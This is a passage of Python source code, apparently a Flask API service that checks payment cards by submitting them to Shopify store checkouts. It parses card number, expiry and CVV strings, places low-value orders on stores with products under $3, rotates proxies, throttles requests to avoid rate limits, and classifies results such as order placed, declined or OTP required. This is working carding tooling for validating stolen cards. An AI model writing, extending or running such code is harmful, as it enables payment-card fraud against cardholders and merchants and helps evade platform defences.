                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif tn == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg  = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif tn == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        if tn in ('ProcessingReceipt', 'WaitingReceipt'):
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass

                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if is_captcha_required(final_text):
                return True, "CARD_DECLINED", gateway, total_price, currency
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            try:
                res_json = json.loads(final_text)
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                result_code = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                if result_code:
                    return True, result_code, gateway, total_price, currency
                return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                code = extract_between(final_text, '{"code":"', '"')
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency


def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    async with _SHOPIFY_SEMAPHORE:
        return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)

# Cap how many cards are checked concurrently to avoid flooding Shopify.
# Raise this carefully – too high → more 429s; too low → slower throughput.
_SHOPIFY_SEMAPHORE = asyncio.Semaphore(10)

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        max_retries = request.args.get('retries', 3, type=int)
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        variant_id = request.args.get('variant')
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # ============ FIX: Use retry function ============
        try:
            # Try up to 3 different sites if needed
            sites_to_try = [site]
            
            # Add some fallback sites if the primary fails
            # You should load these from your autosopi_site_manager
            fallback_sites = [

            ]
            
            # For the first attempt, try the requested site
            success = False
            message = "No sites with products under $3 found"
            gateway = "UNKNOWN"
            price = "0.00"
            currency = "USD"
            final_response = "No products under $3 found!"
            
            for attempt, current_site in enumerate(sites_to_try + fallback_sites):
                if attempt > max_retries:
                    break
                
                if attempt > 0 and current_site in sites_to_try[:attempt]:
                    continue  # Skip already tried sites
                
                print(f"🔍 Attempt {attempt + 1}: Trying site {current_site}")
                
                try:
                    success, message, gateway, price, currency = loop.run_until_complete(
                        process_card_async(cc, mes, ano, cvv, current_site, variant_id, proxy_str)
                    )
                    
                    # If we got a result other than "No products under $3", break
                    if success or (not success and "No products under $3" not in str(message)):
                        break
                    
                    print(f"⚠️ Site {current_site}: {message}")
                    
                except Exception as e:
                    print(f"❌ Error with site {current_site}: {e}")
                    continue
            
        finally:
            loop.close()
        
        clean_response = extract_clean_response(message)
        
        try:
            price_float = float(price) if price else 0.0
        except:
            price_float = 0.0
        
        response_data = {
            "Gateway": gateway,
            "Price": price_float,
            "Response": clean_response,
            "Status": success,
            "cc": cc_string,
            "PriceUnder3": price_float < 3.00,
            "Attempts": attempt + 1
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', ''),
            "PriceUnder3": False
        }), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
